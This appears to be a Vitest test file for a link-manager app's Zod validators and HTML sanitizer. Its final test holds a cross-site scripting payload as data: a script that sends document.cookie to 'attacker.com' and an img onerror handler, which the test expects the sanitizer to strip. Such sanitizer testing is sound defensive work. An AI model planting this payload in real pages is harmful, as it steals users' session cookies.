import { describe, it, expect } from 'vitest';
import {
  CreateLinkSchema,
  UpdateLinkSchema,
  BatchActionSchema,
  MergeLinkSchema,
  AskRepoSchema,
  sanitizeText,
} from '../server/validators';

describe('Zod Validation & Security Suite', () => {
  it('validates CreateLinkSchema and enforces valid URLs', () => {
    expect(CreateLinkSchema.safeParse({ url: 'not-a-valid-url' }).success).toBe(false);
    expect(CreateLinkSchema.safeParse({ url: 'https://github.com/torvalds/linux', tags: ['c', 'kernel'] }).success).toBe(true);
  });

  it('validates UpdateLinkSchema with restricted readStatus enums', () => {
    expect(UpdateLinkSchema.safeParse({ readStatus: 'invalid-status' }).success).toBe(false);
    expect(UpdateLinkSchema.safeParse({ readStatus: 'reading', isFavorite: true }).success).toBe(true);
  });

  it('validates BatchActionSchema requiring at least one ID', () => {
    expect(BatchActionSchema.safeParse({ ids: [], action: 'delete' }).success).toBe(false);
    expect(BatchActionSchema.safeParse({ ids: ['link-1'], action: 'markRead' }).success).toBe(true);
  });

  it('validates MergeLinkSchema supporting mode selection', () => {
    expect(MergeLinkSchema.safeParse({ title: 'New Title', mode: 'smart' }).success).toBe(true);
    expect(MergeLinkSchema.safeParse({ title: 'New Title', mode: 'invalid_mode' }).success).toBe(false);
  });

  it('validates AskRepoSchema length boundaries', () => {
    expect(AskRepoSchema.safeParse({ question: '' }).success).toBe(false);
    expect(AskRepoSchema.safeParse({ question: 'How do I optimize SQLite queries?' }).success).toBe(true);
  });

  it('sanitizes malicious HTML payloads', () => {
    const dirty = '<p>Normal text <script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script><img src="x" onerror="alert(1)"> <strong>Bold Text</strong></p>';
    const clean = sanitizeText(dirty);
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('onerror');
    expect(clean).toContain('<strong>Bold Text</strong>');
  });
});
